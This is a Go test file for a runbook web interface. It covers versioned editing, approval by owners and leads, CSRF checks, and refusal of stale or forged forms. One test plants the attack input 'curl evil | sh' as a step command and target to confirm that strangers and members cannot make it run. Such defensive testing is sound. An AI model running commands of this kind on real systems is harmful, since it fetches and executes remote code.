package web

import (
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"testing"

	"github.com/Deadweight-Labs/ghosttree/internal/runbook"
	"github.com/Deadweight-Labs/ghosttree/internal/store"
)

func rbForm(name string) url.Values {
	return url.Values{
		"project": {shellProject}, "mode": {"new"}, "machine": {""}, "name": {name}, "purpose": {"Roll out the thing."},
		"param_name": {"tag", ""}, "param_type": {"string", "string"}, "param_desc": {"Image tag", ""}, "param_req": {"required", "required"}, "param_default": {"", ""}, "param_values": {"", ""},
		"preconditions": {"The key is loaded\nThe tree is clean"},
		"step_title":    {"Build", ""}, "step_command": {"make check | tail -n 5", ""}, "step_check": {"exit code 0", ""},
		"back_title": {"Restore", ""}, "back_command": {"echo back", ""}, "back_check": {"", ""},
		"pitfalls": {""}, "keywords": {"rollout\nroll out"}, "commands": {"ssh *thing*"}, "paths": {""}, "note": {"first"},
	}
}

func rbHead(t *testing.T, e shellEnv, name string) (runbook.View, store.RunbookRef) {
	t.Helper()
	ref, err := e.St.RunbookRefByScope(shellProject, "", name, 1)
	if err != nil {
		t.Fatalf("runbook %s: %v", name, err)
	}
	v, err := e.St.RunbookView(ref.ID, 0)
	if err != nil {
		t.Fatal(err)
	}
	return v, ref
}

// Ein Ablauf wird im Web angelegt und bearbeitet, versioniert wie runbook_write
// (REQ-604 K1); freigegeben ist eine Fassung nur, wenn ein Owner oder Lead es verlangt.
func TestARunbookIsCreatedAndEditedInTheWebAsVersionsAndOnlyOwnersAndLeadsApprove(t *testing.T) {
	e := ovEnv(t)
	_, list := fetchPage(t, e.Member, e.Base+"/ui/x/shell/runbooks")
	if !strings.Contains(list, `href="/ui/x/shell/runbooks/new"`) || !strings.Contains(list, "Create the first runbook") {
		t.Error("a member gets no button for a new runbook")
	}
	if _, g := fetchPage(t, e.Guest, e.Base+"/ui/x/shell/runbooks"); strings.Contains(g, "/runbooks/new") {
		t.Error("a guest gets the button for a new runbook")
	}
	_, form := fetchPage(t, e.Member, e.Base+"/ui/x/shell/runbooks/new")
	for _, want := range []string{`action="/ui/runbooks/write"`, `name="csrf_token"`, `name="name"`, `name="purpose"`, `name="step_command"`, `name="back_command"`, `name="param_type"`, `name="keywords"`, "Create runbook"} {
		if !strings.Contains(form, want) {
			t.Errorf("the form lacks %q", want)
		}
	}
	// A member ticks "approve" in a forged form: they have no such right, so nothing is approved.
	f := rbForm("rollout-thing")
	f.Set("approve", "1")
	resp := postForm(t, e, e.Member, "/ui/runbooks/write", f)
	if resp.StatusCode != http.StatusSeeOther || !strings.Contains(resp.Header.Get("Location"), "/ui/x/shell/runbooks/rollout-thing?done=saved") {
		t.Fatalf("member creates -> %d %q", resp.StatusCode, resp.Header.Get("Location"))
	}
	v, _ := rbHead(t, e, "rollout-thing")
	if v.Version != 1 || v.Approved || v.Spec.Purpose != "Roll out the thing." || len(v.Spec.Steps) != 1 || v.Spec.Steps[0].Command != "make check | tail -n 5" ||
		len(v.Spec.Params) != 1 || v.Spec.Params[0].Name != "tag" || len(v.Spec.Preconditions) != 2 || len(v.Spec.Triggers.Keywords) != 2 || v.Note != "first" {
		t.Fatalf("stored runbook: %+v", v)
	}
	_, page := fetchPage(t, e.Member, e.Base+"/ui/x/shell/runbooks/rollout-thing?done=saved")
	for _, want := range []string{"Version 1 saved", "becomes active after approval", "Edit", `href="/ui/x/shell/runbooks/rollout-thing?edit=1"`, "make check | tail -n 5", "Approval needed"} {
		if !strings.Contains(page, want) {
			t.Errorf("the runbook page lacks %q", want)
		}
	}
	// The same content again is no new version.
	if r := postForm(t, e, e.Owner, "/ui/runbooks/write", rbEdit(t, e, "rollout-thing")); !strings.Contains(r.Header.Get("Location"), "done=unchanged") {
		t.Errorf("the same content -> %q, want unchanged", r.Header.Get("Location"))
	}
	// Editing prefills the form, and a new version is a version of the same runbook.
	_, edit := fetchPage(t, e.Owner, e.Base+"/ui/x/shell/runbooks/rollout-thing?edit=1")
	for _, want := range []string{`value="rollout-thing" maxlength="64" required readonly`, `value="make check | tail -n 5"`, `value="Image tag"`, "The key is loaded", `name="approve" value="1"`, "Save as new version"} {
		if !strings.Contains(edit, want) {
			t.Errorf("the edit form lacks %q", want)
		}
	}
	two := rbEdit(t, e, "rollout-thing")
	two.Set("purpose", "Roll out the thing, version two.")
	two.Set("approve", "1")
	two.Set("note", "second")
	if r := postForm(t, e, e.Owner, "/ui/runbooks/write", two); !strings.Contains(r.Header.Get("Location"), "done=approved") {
		t.Fatalf("owner saves version 2 approved -> %q", r.Header.Get("Location"))
	}
	if v, ref := rbHead(t, e, "rollout-thing"); v.Version != 2 || !v.Approved || v.Spec.Purpose != "Roll out the thing, version two." || v.Versions != 2 {
		t.Fatalf("after the owner's edit: %+v", v)
	} else if old, _ := e.St.RunbookView(ref.ID, 1); old.Approved || old.Spec.Purpose != "Roll out the thing." {
		t.Errorf("version 1 changed: %+v", old)
	}
	// A member edits: a new version, not approved, the approved one stays the one in use.
	three := rbEdit(t, e, "rollout-thing")
	three.Set("purpose", "Member tweak.")
	three.Set("approve", "1")
	if r := postForm(t, e, e.Member, "/ui/runbooks/write", three); !strings.Contains(r.Header.Get("Location"), "done=saved") {
		t.Fatalf("member edits -> %q", r.Header.Get("Location"))
	}
	if v, _ := rbHead(t, e, "rollout-thing"); v.Version != 3 || v.Approved || v.ApprovedVersion != 2 {
		t.Errorf("after the member's edit: version %d approved=%v approved version %d", v.Version, v.Approved, v.ApprovedVersion)
	}
	// A lead may approve too.
	four := rbEdit(t, e, "rollout-thing")
	four.Set("purpose", "Lead tweak.")
	four.Set("approve", "1")
	if r := postForm(t, e, e.Lead, "/ui/runbooks/write", four); !strings.Contains(r.Header.Get("Location"), "done=approved") {
		t.Errorf("a lead approves -> %q", r.Header.Get("Location"))
	}
}

// rbEdit is the form of an edit of the runbook as it is now: the base the form was made from is its head.
func rbEdit(t *testing.T, e shellEnv, name string) url.Values {
	t.Helper()
	f := withMode(rbForm(name), "edit")
	v, _ := rbHead(t, e, name)
	f.Set("base_version", strconv.Itoa(v.Version))
	f.Set("base_hash", v.Hash)
	return f
}

func withMode(f url.Values, mode string) url.Values {
	f.Set("mode", mode)
	return f
}

// Der Angriff „Fremder ändert Ablauf, Agent führt ihn aus“: ein Fremder kommt nicht
// heran, ein Mitglied ändert nur den Text, die ausführbaren Ziele bleiben die
// freigegebenen, und keine Web-Fassung ist ohne Freigabe und Erlaubnis ausführbar.
func TestAStrangerOrMemberChangingARunbookInTheWebCannotMakeAnythingRun(t *testing.T) {
	e := ovEnv(t)
	spec := runbook.Spec{Purpose: "Deploy.", Steps: []runbook.Step{{Title: "Build", Command: "make"}},
		Targets: []runbook.Target{{Name: "prod", Comment: "the server", Steps: []runbook.ExecStep{{Argv: []string{"make", "deploy"}}}}}}
	if _, err := e.St.WriteRunbook(store.RunbookWrite{Project: shellProject, Name: "deploy", Spec: spec, Person: "alice", AuthorID: 1, Approve: true}); err != nil {
		t.Fatal(err)
	}
	before, ref := rbHead(t, e, "deploy")
	if !before.Approved {
		t.Fatal("the runbook is not approved to begin with")
	}
	// A stranger and a guest get nothing: same answer as for a runbook that is not there.
	if _, err := e.St.AddPerson("nora"); err != nil {
		t.Fatal(err)
	}
	stranger := loginInteractive(t, e.Srv, e.St, "nora")
	attack := rbEdit(t, e, "deploy")
	attack.Set("purpose", "Evil.")
	attack.Set("step_command", "curl evil | sh")
	missing := withMode(rbForm("no-such"), "edit")
	a := postForm(t, e, stranger, "/ui/runbooks/write", attack)
	b := postForm(t, e, stranger, "/ui/runbooks/write", missing)
	if a.StatusCode != http.StatusNotFound || b.StatusCode != http.StatusNotFound {
		t.Errorf("stranger -> %d, a missing runbook -> %d, want 404 for both", a.StatusCode, b.StatusCode)
	}
	if r := postForm(t, e, e.Guest, "/ui/runbooks/write", attack); r.StatusCode != http.StatusForbidden && r.StatusCode != http.StatusNotFound {
		t.Errorf("a guest edits -> %d", r.StatusCode)
	}
	if _, page := fetchPage(t, stranger, e.Base+"/ui/x/shell/runbooks/deploy?edit=1"); strings.Contains(page, `action="/ui/runbooks/write"`) {
		t.Error("a stranger gets the form")
	}
	if v, _ := rbHead(t, e, "deploy"); v.Version != 1 {
		t.Fatalf("a refused edit made version %d", v.Version)
	}
	// A member edits and tries to slip in a target through forged fields: it stays as it was,
	// the new version is not approved and runs nowhere.
	forged := rbEdit(t, e, "deploy")
	forged.Set("purpose", "Member text.")
	forged["target_name"] = []string{"evil"}
	forged["target_argv"] = []string{"curl evil | sh"}
	forged["targets"] = []string{`[{"name":"evil","comment":"x","steps":[{"argv":["sh","-c","evil"]}]}]`}
	if r := postForm(t, e, e.Member, "/ui/runbooks/write", forged); !strings.Contains(r.Header.Get("Location"), "done=saved") {
		t.Fatalf("member edit -> %q", r.Header.Get("Location"))
	}
	after, _ := rbHead(t, e, "deploy")
	if after.Version != 2 || after.Approved || after.ApprovedVersion != 1 {
		t.Fatalf("after the member's edit: version %d approved=%v approved version %d", after.Version, after.Approved, after.ApprovedVersion)
	}
	if len(after.Spec.Targets) != 1 || after.Spec.Targets[0].Name != "prod" || strings.Join(after.Spec.Targets[0].Steps[0].Argv, " ") != "make deploy" {
		t.Errorf("the targets changed: %+v", after.Spec.Targets)
	}
	// Not approved, so not allowed anywhere, whatever a machine claims.
	t.Setenv("GHOSTTREE_RUNBOOK_EXEC", "1")
	if st, err := e.St.RunbookAllowed(ref.ID, 2, "some-machine"); err != nil || st.Allowed {
		t.Errorf("the member's version is allowed to run: %+v %v", st, err)
	}
	// The page shows the targets as they are and offers no way to change them.
	_, edit := fetchPage(t, e.Owner, e.Base+"/ui/x/shell/runbooks/deploy?edit=1")
	if !strings.Contains(edit, "make deploy") || !strings.Contains(edit, "run only on a machine whose operator allowed this version") || strings.Contains(edit, `name="target`) {
		t.Errorf("the edit form does not show the targets read-only")
	}
}

func TestTheRunbookFormRefusesWhatTheModelRefusesAndKeepsTheInput(t *testing.T) {
	e := ovEnv(t)
	refuse := func(name string, mutate func(url.Values), want string) {
		t.Helper()
		f := rbForm("ok-name")
		mutate(f)
		sameOriginPostForm(t, e.Member, e.Base+"/ui/runbooks/write", url.Values{}).Body.Close()
		f.Set("csrf_token", renderedCSRFToken(t, e.Member, e.Base+"/ui/overview"))
		resp := sameOriginPostForm(t, e.Member, e.Base+"/ui/runbooks/write", f)
		page := body(t, resp)
		if resp.StatusCode != http.StatusUnprocessableEntity || !strings.Contains(page, want) || !strings.Contains(page, `value="Roll out`) && name != "purpose" {
			t.Errorf("%s -> %d, lacks %q or the input is lost", name, resp.StatusCode, want)
		}
	}
	refuse("name", func(f url.Values) { f.Set("name", "Bad Name") }, "The runbook cannot be saved:")
	refuse("new", func(f url.Values) { f.Set("name", "new") }, "is the address of this form")
	refuse("purpose", func(f url.Values) { f.Set("purpose", "") }, "The runbook cannot be saved:")
	refuse("type", func(f url.Values) { f["param_type"] = []string{"banana", "string"} }, "The runbook cannot be saved:")
	refuse("param name", func(f url.Values) { f["param_name"] = []string{"Bad Name", ""} }, "parameter name")
	refuse("pitfalls", func(f url.Values) { f.Set("pitfalls", "abc") }, "numbers of knowledge entries")
	refuse("control characters", func(f url.Values) { f["step_command"] = []string{"echo\x07 bell", ""} }, "The runbook cannot be saved:")
	if _, err := e.St.RunbookRefByScope(shellProject, "", "ok-name", 1); err == nil {
		t.Error("a refused form stored a runbook")
	}
	// A runbook of that name is not silently overwritten by the "new" form.
	if r := postForm(t, e, e.Owner, "/ui/runbooks/write", rbForm("taken")); r.StatusCode != http.StatusSeeOther {
		t.Fatalf("create -> %d", r.StatusCode)
	}
	again := rbForm("taken")
	again.Set("purpose", "Overwrite.")
	sameOriginPostForm(t, e.Owner, e.Base+"/ui/runbooks/write", url.Values{}).Body.Close()
	again.Set("csrf_token", renderedCSRFToken(t, e.Owner, e.Base+"/ui/overview"))
	resp := sameOriginPostForm(t, e.Owner, e.Base+"/ui/runbooks/write", again)
	if page := body(t, resp); resp.StatusCode != http.StatusUnprocessableEntity || !strings.Contains(page, "exists already") {
		t.Errorf("a second runbook of the same name -> %d", resp.StatusCode)
	}
	if v, _ := rbHead(t, e, "taken"); v.Version != 1 || v.Spec.Purpose != "Roll out the thing." {
		t.Errorf("the existing runbook was changed: %+v", v)
	}
	// No token, no write; a project nobody has a role in is as unknown as a missing one.
	resp = sameOriginPostForm(t, e.Owner, e.Base+"/ui/runbooks/write", rbForm("no-token"))
	resp.Body.Close()
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("without a token -> %d, want 403", resp.StatusCode)
	}
	hidden := rbForm("elsewhere")
	hidden.Set("project", "github.com/x/none")
	if r := postForm(t, e, e.Owner, "/ui/runbooks/write", hidden); r.StatusCode != http.StatusNotFound {
		t.Errorf("an unknown project -> %d, want 404", r.StatusCode)
	}
}

// Eine Ablehnung der Eingabe verrät niemandem, der den Ablauf nicht lesen darf, dass
// es ihn gibt, und zeigt keine seiner Ziele: erst die Rechte, dann die Prüfung.
func TestARefusedRunbookFormTellsNothingToWhoMayNotReadTheRunbook(t *testing.T) {
	e := ovEnv(t)
	spec := runbook.Spec{Purpose: "Deploy.", Steps: []runbook.Step{{Title: "Build", Command: "make"}},
		Targets: []runbook.Target{{Name: "prod", Comment: "the server", Steps: []runbook.ExecStep{{Argv: []string{"make", "SECRET-DEPLOY"}}}}}}
	if _, err := e.St.WriteRunbook(store.RunbookWrite{Project: shellProject, Name: "deploy", Spec: spec, Person: "alice", AuthorID: 1, Approve: true}); err != nil {
		t.Fatal(err)
	}
	if _, err := e.St.AddPerson("nora"); err != nil {
		t.Fatal(err)
	}
	stranger := loginInteractive(t, e.Srv, e.St, "nora")
	post := func(c *http.Client, mutate func(url.Values)) (int, string) {
		f := rbForm("deploy")
		mutate(f)
		f.Set("csrf_token", renderedCSRFToken(t, c, e.Base+"/ui/overview"))
		resp := sameOriginPostForm(t, c, e.Base+"/ui/runbooks/write", f)
		return resp.StatusCode, body(t, resp)
	}
	invalidEdit := func(f url.Values) {
		v, _ := rbHead(t, e, "deploy")
		f.Set("mode", "edit")
		f.Set("base_hash", v.Hash)
		f.Set("purpose", "")
	}
	nameTaken := func(f url.Values) {}
	missing := func(f url.Values) { f.Set("name", "no-such") }
	for who, c := range map[string]*http.Client{"guest": e.Guest, "stranger": stranger} {
		for what, mutate := range map[string]func(url.Values){"an invalid edit": invalidEdit, "the name of an existing runbook": nameTaken} {
			code, page := post(c, mutate)
			if code != http.StatusNotFound && code != http.StatusForbidden {
				t.Errorf("%s with %s -> %d, want a refusal", who, what, code)
			}
			if strings.Contains(page, "SECRET-DEPLOY") || strings.Contains(page, "exists already") {
				t.Errorf("%s with %s learns something about the runbook", who, what)
			}
		}
		a, _ := post(c, nameTaken)
		b, _ := post(c, missing)
		if a != b {
			t.Errorf("%s: an existing name answers %d, a missing one %d", who, a, b)
		}
	}
	// Whoever may read it, hears that the name is taken; whoever may edit it, sees the targets read-only.
	if code, page := post(e.Member, nameTaken); code != http.StatusUnprocessableEntity || !strings.Contains(page, "exists already") {
		t.Errorf("a member creating over an existing name -> %d", code)
	}
	if code, page := post(e.Member, invalidEdit); code != http.StatusUnprocessableEntity || !strings.Contains(page, "SECRET-DEPLOY") {
		t.Errorf("a member with an invalid edit -> %d, the form should carry the stored targets read-only", code)
	}
}

// Was freigegeben wird, muss der Mensch gesehen haben: wurde zwischen Öffnen und
// Absenden eine andere Fassung geschrieben (etwa mit anderen Zielen), wird nichts
// gespeichert und nichts freigegeben; das Formular zeigt dann den jetzigen Stand.
func TestAStaleRunbookFormSavesAndApprovesNothing(t *testing.T) {
	e := ovEnv(t)
	first := runbook.Spec{Purpose: "Deploy.", Steps: []runbook.Step{{Title: "Build", Command: "make"}},
		Targets: []runbook.Target{{Name: "prod", Comment: "the server", Steps: []runbook.ExecStep{{Argv: []string{"make", "deploy"}}}}}}
	if _, err := e.St.WriteRunbook(store.RunbookWrite{Project: shellProject, Name: "deploy", Spec: first, Person: "alice", AuthorID: 1, Approve: true}); err != nil {
		t.Fatal(err)
	}
	// The owner opens the form and sees the targets of version 1.
	_, edit := fetchPage(t, e.Owner, e.Base+"/ui/x/shell/runbooks/deploy?edit=1")
	m := regexp.MustCompile(`name="base_hash" value="([0-9a-f]+)"`).FindStringSubmatch(edit)
	if m == nil || !strings.Contains(edit, `name="base_version" value="1"`) || !strings.Contains(edit, "make deploy") {
		t.Fatalf("the edit form does not name its base: %s", edit[:min(len(edit), 200)])
	}
	// Meanwhile somebody writes version 2 with other targets.
	second := first
	second.Targets = []runbook.Target{{Name: "prod", Comment: "the server", Steps: []runbook.ExecStep{{Argv: []string{"make", "SNEAKY-DEPLOY"}}}}}
	if _, err := e.St.WriteRunbook(store.RunbookWrite{Project: shellProject, Name: "deploy", Spec: second, Person: "anna", AuthorID: 2}); err != nil {
		t.Fatal(err)
	}
	stale := rbForm("deploy")
	stale.Set("mode", "edit")
	stale.Set("base_version", "1")
	stale.Set("base_hash", m[1])
	stale.Set("approve", "1")
	stale.Set("csrf_token", renderedCSRFToken(t, e.Owner, e.Base+"/ui/overview"))
	resp := sameOriginPostForm(t, e.Owner, e.Base+"/ui/runbooks/write", stale)
	page := body(t, resp)
	if resp.StatusCode != http.StatusConflict || !strings.Contains(page, "was changed while you were editing it") || !strings.Contains(page, "SNEAKY-DEPLOY") {
		t.Fatalf("a stale form -> %d, the page should say so and show the targets as they are now", resp.StatusCode)
	}
	if strings.Contains(page, `name="approve" value="1" checked`) {
		t.Error("the tick to approve is carried over a change the person has not seen")
	}
	if v, _ := rbHead(t, e, "deploy"); v.Version != 2 || v.Approved {
		t.Fatalf("a stale form wrote or approved something: version %d approved=%v", v.Version, v.Approved)
	}
	// A form with no base at all is as stale as one with an old one.
	forged := rbEdit(t, e, "deploy")
	forged.Del("base_hash")
	if r := postForm(t, e, e.Owner, "/ui/runbooks/write", forged); r.StatusCode != http.StatusConflict {
		t.Errorf("a form without a base -> %d, want 409", r.StatusCode)
	}
	// The form the page gives back carries the new base; saving it works, the person has seen the targets.
	n := regexp.MustCompile(`name="base_hash" value="([0-9a-f]+)"`).FindStringSubmatch(page)
	if n == nil || n[1] == m[1] {
		t.Fatal("the form shown after the refusal does not carry the new base")
	}
	stale.Set("base_hash", n[1])
	stale.Set("base_version", "2")
	if r := postForm(t, e, e.Owner, "/ui/runbooks/write", stale); !strings.Contains(r.Header.Get("Location"), "done=approved") {
		t.Errorf("saving with the new base -> %d %q", r.StatusCode, r.Header.Get("Location"))
	}
}
